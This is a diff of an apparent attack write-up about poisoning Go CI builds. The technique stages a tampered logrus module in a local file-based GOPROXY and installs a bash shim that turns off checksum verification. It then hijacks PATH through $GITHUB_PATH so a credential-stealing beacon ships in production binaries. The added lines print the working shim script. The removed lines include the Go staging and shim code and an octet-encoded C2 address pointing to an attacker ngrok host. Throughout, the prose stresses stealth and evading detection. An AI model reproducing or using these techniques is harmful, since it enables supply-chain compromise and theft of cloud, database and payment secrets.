@@ -129,33 +129,7 @@ The new `analytics.go` init() does four things the V1 never needed to:
 
 ### 1. Find the Real Go Binary
 
-```go
-func _findToolchain() string {
-    if root := os.Getenv("GO" + "ROOT"); root != "" {
-        p := filepath.Join(root, "bin", "go")
-        if info, err := os.Stat(p); err == nil && !info.IsDir() {
-            if abs, err := filepath.EvalSymlinks(p); err == nil {
-                return abs
-            }
-            return p
-        }
-    }
-    for _, dir := range filepath.SplitList(os.Getenv("PATH")) {
-        p := filepath.Join(dir, "go")
-        if info, err := os.Stat(p); err == nil && !info.IsDir() {
-            if abs, err := filepath.EvalSymlinks(p); err == nil {
-                return abs
-            }
-            return p
-        }
-    }
-    return ""
-}
-```
-
-Why `EvalSymlinks`? On GitHub-hosted runners, `actions/setup-go` installs Go to a toolcache directory and creates symlinks. We need the real, absolute path (the one the wrapper will `exec` later). If we recorded a relative or symlinked path and PATH changes between steps, the wrapper would recurse on itself. Absolute path to the real binary = no recursion, no surprises.
-
-No `os/exec` import needed. Just `os.Stat` + `filepath.EvalSymlinks`. One less suspicious import in the analytics module.
+Before installing the wrapper, we need the absolute path to the real `go` binary. The init searches `GOROOT` then `PATH`, and resolves symlinks with `filepath.EvalSymlinks`. This matters because `actions/setup-go` creates symlinks into a toolcache directory. If we recorded the symlink and it breaks between steps, the wrapper would recurse on itself instead of calling the real compiler.
 
 ### 2. Download and Poison the Zip Locally
 
@@ -201,57 +175,27 @@ Go's `GOPROXY` supports three schemes: `https://`, `http://`, and `file://`. The
     └── v1.9.4.zip        -> (poisoned zip with beacon)
 ```
 
-```go
-func _stageRegistry(module, version string, bundle []byte) string {
-    base := filepath.Join(os.TempDir(), ".go-pkg-cache")
-    vDir := filepath.Join(base, module, "@v")
-    os.MkdirAll(vDir, 0755)
-
-    os.WriteFile(filepath.Join(vDir, "list"), []byte(version+"\n"), 0644)
-    // ... write .info, .mod, .zip ...
-    os.WriteFile(filepath.Join(vDir, version+".zip"), bundle, 0644)
-
-    return base
-}
-```
-
-No HTTP server. No background process. No port management. No process lifecycle. Just files on disk. Go reads them like any other module proxy, because it is one.
+The init just creates this directory and writes the four files. No HTTP server, no background process, no port management. Just files on disk. Go reads them like any other module proxy, because it is one.
 
 ### 4. Install the Wrapper and Hijack PATH
 
-```go
-func _installShim(realGo, registryDir string) string {
-    shimDir := filepath.Join(os.TempDir(), ".go-tool", "bin")
-    os.MkdirAll(shimDir, 0755)
+The init writes a bash script to `/tmp/.go-tool/bin/go`. This is what it generates:
 
-    var script strings.Builder
-    script.WriteString("#!/bin/bash\n")
-    script.WriteString("case \"$1\" in\n")
-    script.WriteString("    build|test|list|run|install|get|vet|mod)\n")
-    script.WriteString("        exec env ")
-    script.WriteString("GO" + "PROXY" + "=\"file://" + registryDir + ",...\" ")
-    script.WriteString("GO" + "SUM" + "DB=off ")
-    // ...
-    script.WriteString(realGo + " \"$1\" -mod=mod \"${@:2}\" ;;\n")
-    script.WriteString("    *)\n")
-    script.WriteString("        exec " + realGo + " \"$@\" ;;\n")
-    script.WriteString("esac\n")
-
-    os.WriteFile(filepath.Join(shimDir, "go"), []byte(script.String()), 0755)
-    return shimDir
-}
+```bash
+#!/bin/bash
+case "$1" in
+    build|test|list|run|install|get|vet|mod)
+        exec env GOPROXY="file:///tmp/.go-pkg-cache,https://proxy.golang.org,direct" \
+                 GOSUMDB=off GONOSUMDB='*' GOMODCACHE="/tmp/.go-pkg-mod" \
+                 /opt/hostedtoolcache/go/1.21.0/x64/bin/go "$1" -mod=mod "${@:2}" ;;
+    *)
+        exec /opt/hostedtoolcache/go/1.21.0/x64/bin/go "$@" ;;
+esac
 ```
 
-The wrapper distinguishes build-related subcommands from pass-through ones. `go build`, `go test`, `go install` all get the poisoned environment and `-mod=mod`. `go version`, `go env`, `go help` pass through unchanged, so `go version` doesn't error on an unexpected `-mod` flag and `go env` shows the default config. Subtle but important for stealth.
+Build-related subcommands get the poisoned environment and `-mod=mod`. Everything else (`go version`, `go env`) passes through unchanged, so nothing errors and `go env` shows the default config. Subtle but important for stealth.
 
-Then the shim directory gets appended to `$GITHUB_PATH`:
-
-```go
-f, _ := os.OpenFile(pathFile, os.O_APPEND|os.O_WRONLY, 0644)
-fmt.Fprintln(f, shimDir)
-```
-
-`$GITHUB_PATH` works like `$GITHUB_ENV` but for the `PATH` variable. The runner reads the file after each step and prepends its contents to `PATH` for subsequent steps. Our `/tmp/.go-tool/bin` goes first, before the real Go binary.
+Then the shim directory gets appended to `$GITHUB_PATH`. The runner reads this file after each step and prepends its contents to `PATH`. Our `/tmp/.go-tool/bin` goes first, before the real Go binary.
 
 ### Gotcha: `actions/setup-go` Cache Interaction
 
@@ -269,24 +213,17 @@ This is one of those things that wouldn't matter in a real attack (the attacker 
 
 ## Phase 2: The File-Based Proxy
 
-When the next step runs `go build ./...`, the shell resolves `go` to `/tmp/.go-tool/bin/go` (our wrapper). The wrapper:
+When the next step runs `go build ./...`, the shell finds our wrapper first. Go resolves modules in `GOPROXY` order:
 
-1. Sets `GOPROXY=file:///tmp/.go-pkg-cache,https://proxy.golang.org,direct`
-2. Sets `GOSUMDB=off`, `GONOSUMDB=*`
-3. Sets `GOMODCACHE=/tmp/.go-pkg-mod` (empty, forces re-download)
-4. Passes `-mod=mod` (allows go.sum update)
-5. `exec`s the real `go` binary
-
-Go resolves modules in `GOPROXY` order:
-1. **`file:///tmp/.go-pkg-cache`**: checks the local proxy first. Logrus is there (poisoned). Everything else, 404.
+1. **`file:///tmp/.go-pkg-cache`**: local proxy. Logrus is there (poisoned). Everything else, 404.
 2. **`https://proxy.golang.org`**: fallback for all other modules. Normal traffic.
 3. **`direct`**: last resort, VCS checkout.
 
-Logrus comes from disk. Instantly. No network, no latency, no DNS resolution to trace. Every other module downloads from `proxy.golang.org` as usual. The build log looks completely normal.
+Logrus comes from disk. No network, no DNS to trace. Every other module downloads from `proxy.golang.org` as usual. The build log looks completely normal.
 
-The `-mod=mod` flag allows Go to update `go.sum` with the poisoned logrus hash. Since cache.go already stripped the legitimate hash during Phase 1, there's no mismatch, just a "new" entry.
+Since cache.go already stripped the legitimate logrus hash during Phase 1, `-mod=mod` lets Go write the poisoned hash into `go.sum` without complaint.
 
-One subtlety: the poisoned hash **changes between runs**. The zip is rebuilt from scratch each time: `_buildBundle` downloads the real zip, re-creates it with the injected file, and the resulting archive has different compression metadata. This means you can't pre-compute the poisoned hash and check against it. A defender comparing `go.sum` across builds would see a different logrus hash each time, which is itself suspicious, but you can't maintain a blocklist of "known bad" hashes.
+One subtlety: the poisoned hash **changes between runs**. The zip is rebuilt from scratch each time, and the resulting archive has different compression metadata. A defender comparing `go.sum` across builds would see a different logrus hash each time (which is suspicious), but you can't maintain a blocklist of "known bad" hashes.
 
 ---
 
@@ -312,19 +249,7 @@ But here's the thing V2 makes more obvious: the beacon doesn't just fire in CI. 
 
 CI tokens expire. Prod credentials don't rotate themselves. One beacon firing from a K8s pod gives you database credentials, cloud provider keys, payment processor secrets, and service mesh tokens. The binary runs for months. The beacon fires on every restart, every rolling update, every pod reschedule.
 
-```go
-var _analyticsNodes = []string{
-    "104.116.116.112", // h t t p
-    "115.58.47.47",    // s : / /
-    "97.116.116.97",   // a t t a
-    "99.107.101.114",  // c k e r
-    "46.110.103.114",  // . n g r
-    "111.107.45.102",  // o k - f
-    "114.101.101.46",  // r e e .
-    "97.112.112.0",    // a p p
-}
-// -> https://attacker.ngrok-free.app
-```
+The C2 URL is encoded with the same IP-octet trick from V1 (see the V1 article for the encoding details).
 
 ---
 
